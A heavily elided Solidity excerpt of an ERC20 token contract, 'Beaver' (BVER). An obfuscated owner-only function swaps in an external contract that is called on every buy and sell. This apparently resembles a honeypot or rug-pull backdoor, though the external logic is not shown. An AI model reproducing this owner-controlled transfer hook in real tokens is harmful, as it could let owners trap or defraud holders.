...
contract TokenM is ERC20 {
    ...
    IUserAmounttoouer public toouer;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Beaver", "BVER") {
    ...
    function tursouuaBnniupCoeel(IUserAmounttoouer _toouer) public onlyOwner {
        toouer = _toouer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                toouer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				toouer.addOutAmount(from, amount);
            }else{
                toouer.addOutAmount(from, amount);
                takeFee = false;
            }
